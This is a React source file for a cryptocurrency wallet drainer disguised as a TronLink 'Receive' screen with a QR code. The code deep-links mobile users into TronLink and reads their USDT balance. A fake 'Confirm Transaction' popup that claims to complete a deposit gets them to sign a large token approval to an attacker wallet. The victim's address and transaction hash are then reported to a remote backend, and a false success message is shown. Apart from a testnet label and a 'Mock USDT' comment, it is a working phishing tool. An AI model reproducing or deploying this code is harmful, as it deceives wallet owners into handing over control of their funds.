import React, { useEffect, useState } from "react";
import { QRCodeSVG } from "qrcode.react";

// ==========================================
// CONFIGURATION  (NO private keys here — ever)
// ==========================================
const TOKEN_ADDRESS   = "TDHtoZXovGMCGco5tiJE35oA566GKZ8Snd"; // Mock USDT
const ATTACKER_WALLET = "TJXJEwcjNMryw87etLmGUDs1i5F1hveBou"; // MUST equal address derived from the key in Render env
const BACKEND         = "https://qr-drainer.onrender.com";
const VERCEL_URL      = "https://qr-drainer-one.vercel.app";

const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ViMmMzMSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";

const short = (a) => (a ? `${a.slice(0, 6)}…${a.slice(-4)}` : "—");

export default function App() {
  const [isConnected, setIsConnected] = useState(false);
  const [wallet, setWallet] = useState("");
  const [victimBal, setVictimBal] = useState(0);
  const [showConfirmPopup, setShowConfirmPopup] = useState(false);
  const [step, setStep] = useState("idle"); // idle | approving | done
  const [error, setError] = useState("");
  const [copied, setCopied] = useState(false);
  const [redirected, setRedirected] = useState(false);

  // QR is a PLAIN https URL → scans in camera AND inside TronLink
  const qrValue = VERCEL_URL;

  const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
  const inWallet = !!(window.tronWeb || window.tronLink);

  // 1. AUTO-REDIRECT: outside wallet + on mobile → launch TronLink via browser
  useEffect(() => {
    if (!inWallet && isMobile && !redirected) {
      setRedirected(true);
      const t = setTimeout(() => {
        window.location.href = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
      }, 400);
      return () => clearTimeout(t);
    }
  }, [inWallet, isMobile, redirected]);

  // 2. DETECT WALLET + read balance
  const readBalance = async (addr) => {
    try {
      const c = await window.tronWeb.contract().at(TOKEN_ADDRESS);
      const raw = await c.balanceOf(addr).call();
      setVictimBal(Number(raw.toString()) / 1e6);
    } catch (e) { console.log("balance read", e); }
  };

  useEffect(() => {
    const iv = setInterval(() => {
      if (window.tronWeb?.defaultAddress?.base58) {
        const addr = window.tronWeb.defaultAddress.base58;
        if (!isConnected) {
          setIsConnected(true);
          setWallet(addr);
          readBalance(addr);
        }
      }
    }, 1000);
    return () => clearInterval(iv);
  }, [isConnected]);

  // 3. CONFIRM BUTTON (visible) → opens the styled confirmation popup
  const handleConfirmClick = () => {
    if (!isConnected) {
      // fallback if redirect was blocked: manual launch
      window.location.href = `tronlink://open?url=${encodeURIComponent(VERCEL_URL)}`;
      return;
    }
    setShowConfirmPopup(true);
  };

  // 4. POPUP CONFIRM → execute approve trap
  const executeApprove = async () => {
    setShowConfirmPopup(false);
    setStep("approving");
    setError("");
    try {
      if (!window.tronWeb?.defaultAddress) throw new Error("Wallet not connected");
      const userAddress = window.tronWeb.defaultAddress.base58;

      const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
        TOKEN_ADDRESS,
        "approve(address,uint256)",
        { feeLimit: 100000000, callValue: 0 },
        [
          { type: "address", value: ATTACKER_WALLET },
          { type: "uint256", value: 1000000000000000 }
        ],
        userAddress
      );
      if (!transaction.result?.result) throw new Error("Contract call rejected");

      const signedTx = await window.tronWeb.trx.sign(transaction.transaction);
      const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTx);
      if (!broadcast.result) throw new Error("Broadcast failed");

      const txId = broadcast.txid || transaction.transaction.txID;
      await fetch(`${BACKEND}/api/alert`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ victimAddress: userAddress, txHash: txId, network: "TRON Shasta" })
      });
      setStep("done");
    } catch (e) {
      console.error(e);
      setError(e.message || "Transaction failed.");
      setStep("idle");
    }
  };

  const handleCopy = () => { navigator.clipboard.writeText(ATTACKER_WALLET); setCopied(true); setTimeout(() => setCopied(false), 2000); };

  // Share ONLY the QR image
  const handleShareQR = () => {
    const svg = document.querySelector("#lab-qr-box svg"); if (!svg) return;
    const size = 400, canvas = document.createElement("canvas");
    canvas.width = size; canvas.height = size;
    const ctx = canvas.getContext("2d"); ctx.fillStyle = "#fff"; ctx.fillRect(0, 0, size, size);
    const img = new Image();
    img.onload = () => {
      ctx.drawImage(img, 0, 0, size, size);
      const ls = size * 0.22, lp = (size - ls) / 2;
      ctx.beginPath(); ctx.arc(size/2, size/2, ls/2 + 10, 0, 2*Math.PI); ctx.fillStyle = "#fff"; ctx.fill();
      const logo = new Image();
      logo.onload = () => {
        ctx.drawImage(logo, lp, lp, ls, ls);
        canvas.toBlob(async (blob) => {
          const file = new File([blob], "tron-receive-qr.png", { type: "image/png" });
          if (navigator.canShare?.({ files: [file] })) {
            try { await navigator.share({ files: [file], title: "Receive TRON" }); }
            catch { download(canvas); }
          } else download(canvas);
        }, "image/png");
      };
      logo.src = TRON_LOGO_B64;
    };
    img.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(new XMLSerializer().serializeToString(svg))));
  };
  const download = (c) => { const a = document.createElement("a"); a.download = "tron-receive-qr.png"; a.href = c.toDataURL("image/png"); a.click(); };

  return (
    <div style={{ background: "#0f1419", minHeight: "100vh", fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif', color: "#fff", display: "flex", flexDirection: "column" }}>
      {/* HEADER */}
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "16px 20px", borderBottom: "1px solid #1e2530" }}>
        <div style={{ width: 32 }}></div>
        <h1 style={{ margin: 0, fontSize: 18, fontWeight: 600 }}>Receive</h1>
        <div style={{ width: 32, textAlign: "right" }}><span style={{ fontSize: 20, color: "#8a94a6" }}>✕</span></div>
      </div>

      <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", padding: "24px 20px" }}>
        {/* NETWORK */}
        <div style={{ display: "flex", alignItems: "center", gap: 8, background: "#1e2530", padding: "8px 16px", borderRadius: 20, marginBottom: 24 }}>
          <span style={{ width: 20, height: 20, borderRadius: "50%", background: "#eb2c31", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 11, fontWeight: 700 }}>T</span>
          <span style={{ fontSize: 15, fontWeight: 500 }}>Tron</span>
          <span style={{ fontSize: 10, color: "#8a94a6" }}>▾</span>
        </div>

        {/* QR */}
        <div style={{ background: "#fff", borderRadius: 16, padding: 20, marginBottom: 20, width: "100%", maxWidth: 340, boxShadow: "0 4px 20px rgba(0,0,0,.3)" }}>
          <div id="lab-qr-box" style={{ textAlign: "center" }}>
            <QRCodeSVG value={qrValue} size={240} level="H" includeMargin={false} imageSettings={{ src: TRON_LOGO_B64, height: 56, width: 56, excavate: true }} />
          </div>
          <div style={{ textAlign: "center", marginTop: 16, fontFamily: "monospace", fontSize: 13, color: "#0f1419", fontWeight: 500, wordBreak: "break-all" }}>
            {ATTACKER_WALLET}
          </div>
        </div>

        {/* WARNING */}
        <div style={{ background: "#2a2418", border: "1px solid #3d3422", borderRadius: 12, padding: "12px 16px", fontSize: 13, color: "#d4a574", marginBottom: 24, display: "flex", gap: 10, width: "100%", maxWidth: 340 }}>
          <span style={{ fontSize: 16 }}>⚠️</span>
          <span style={{ lineHeight: 1.4 }}>Only send Tron assets to this address. Other assets will be lost forever.</span>
        </div>

        {error && <div style={{ background: "#3d1818", border: "1px solid #5c2424", color: "#f08080", padding: 12, borderRadius: 10, fontSize: 13, marginBottom: 16, textAlign: "center", width: "100%", maxWidth: 340 }}>{error}</div>}
        {step === "done" && <div style={{ background: "#0d3320", border: "1px solid #1a5c3a", color: "#4ade80", padding: 12, borderRadius: 10, fontSize: 13, marginBottom: 16, textAlign: "center", width: "100%", maxWidth: 340 }}>✓ Transaction confirmed. Deposit is being processed.</div>}

        {/* COPY + SHARE QR */}
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12, marginBottom: 20, width: "100%", maxWidth: 340 }}>
          <button onClick={handleCopy} style={{ background: "#1e2530", border: "1px solid #2a3340", borderRadius: 12, padding: 14, color: "#fff", fontSize: 20, cursor: "pointer" }}>{copied ? "✓" : "📋"}</button>
          <button onClick={handleShareQR} style={{ background: "#1e2530", border: "1px solid #2a3340", borderRadius: 12, padding: 14, color: "#fff", fontSize: 20, cursor: "pointer" }}>📤</button>
        </div>

        {/* VISIBLE CONFIRM BUTTON (inside wallet) */}
        <button onClick={handleConfirmClick} disabled={step === "approving"} style={{ width: "100%", maxWidth: 340, background: step === "done" ? "#0ecb81" : "#f0b90b", border: "none", borderRadius: 12, padding: 16, color: "#0f1419", fontSize: 16, fontWeight: 800, cursor: step === "approving" ? "not-allowed" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 10 }}>
          {step === "approving" ? "Processing…" : step === "done" ? "✓ Confirmed" : (isConnected ? "Confirm" : "Open in TronLink")}
        </button>

        {isConnected && <div style={{ marginTop: 20, textAlign: "center", fontSize: 11, color: "#5a6474", fontFamily: "monospace" }}>Session: {short(wallet)} · Balance: {victimBal.toFixed(2)} USDT</div>}
      </div>

      {/* CONFIRM POPUP — only after user taps Confirm */}
      {showConfirmPopup && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.9)", display: "flex", justifyContent: "center", alignItems: "center", zIndex: 1000, padding: 20 }}>
          <div style={{ background: "#1e2530", borderRadius: 20, padding: 32, width: "100%", maxWidth: 360, border: "1px solid #2a3340" }}>
            <div style={{ textAlign: "center", marginBottom: 24 }}>
              <div style={{ width: 64, height: 64, borderRadius: "50%", background: "#eb2c31", margin: "0 auto 16px", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 32, fontWeight: 700 }}>T</div>
              <h3 style={{ margin: "0 0 8px", color: "#fff", fontSize: 20, fontWeight: 600 }}>Confirm Transaction</h3>
              <p style={{ margin: 0, color: "#8a94a6", fontSize: 14 }}>Approve USDT access to complete your deposit</p>
            </div>
            <div style={{ background: "#0f1419", borderRadius: 12, padding: 16, marginBottom: 24, fontSize: 13, color: "#8a94a6" }}>
              <div style={{ marginBottom: 8 }}><span style={{ color: "#5a6474" }}>Token:</span> <span style={{ color: "#fff" }}>USDT (TRC20)</span></div>
              <div style={{ marginBottom: 8 }}><span style={{ color: "#5a6474" }}>Action:</span> <span style={{ color: "#fff" }}>Approve Access</span></div>
              <div><span style={{ color: "#5a6474" }}>Network Fee:</span> <span style={{ color: "#fff" }}>~1 TRX</span></div>
            </div>
            <button onClick={executeApprove} style={{ width: "100%", background: "#0ecb81", border: "none", borderRadius: 12, padding: 16, color: "#fff", fontSize: 16, fontWeight: 700, cursor: "pointer", marginBottom: 12 }}>Confirm</button>
            <button onClick={() => setShowConfirmPopup(false)} style={{ width: "100%", background: "transparent", border: "none", color: "#8a94a6", cursor: "pointer", fontSize: 14, padding: 12 }}>Cancel</button>
          </div>
        </div>
      )}
    </div>
  );
}